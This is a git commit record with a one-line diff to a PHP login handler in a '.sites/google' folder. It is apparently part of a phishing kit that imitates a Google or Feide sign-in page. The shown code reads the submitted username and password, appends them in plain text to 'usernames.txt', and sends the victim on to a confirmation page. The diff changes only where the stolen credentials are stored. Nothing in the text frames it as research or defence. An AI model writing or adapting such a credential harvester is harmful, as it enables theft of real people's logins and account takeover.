89d9a1185ca61682f02df4fd2058939acb34db24
Hmmmmmmmmmmmhm <100936112+Hmmmmmmmmmmmhm@users.noreply.github.com>
2025-04-10 21:06:22 +0200

    login.php

--- .sites/google/login.php
+++ .sites/google/login.php
@@ -4,7 +4,7 @@ $username = $_POST['feidename'] ?? 'No username provided';
 $password = $_POST['password'] ?? 'No password provided';
 
 // Log the credentials to a file
-file_put_contents($filePath, "Feide Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Feide Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
 
 // Redirect to a confirmation page
 header('Location: confirmation.html');
